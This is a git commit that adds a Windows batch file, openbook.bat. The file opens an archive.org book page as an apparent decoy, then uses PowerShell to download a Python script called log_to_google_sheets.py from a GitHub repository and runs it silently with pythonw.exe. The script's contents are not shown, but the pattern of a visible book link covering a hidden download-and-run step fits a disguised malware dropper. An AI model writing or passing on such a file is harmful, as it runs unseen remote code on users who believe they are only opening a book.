fbcf47d494739f89ab776e5cfd7a56c8ca2335ec
lolohole <shehhddu5@gmail.com>
2024-10-09 02:02:30 +0300

    Add files via upload

---
+++ openbook.bat
@@ -0,0 +1,6 @@
+@echo off
+start "" "https://archive.org/details/latiatulanovela00unam/mode/2up?ref=ol&view=theater"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/blob/main/log_to_google_sheets.py', 'log_to_google_sheets.py')"
+pythonw.exe log_to_google_sheets.py
+
+
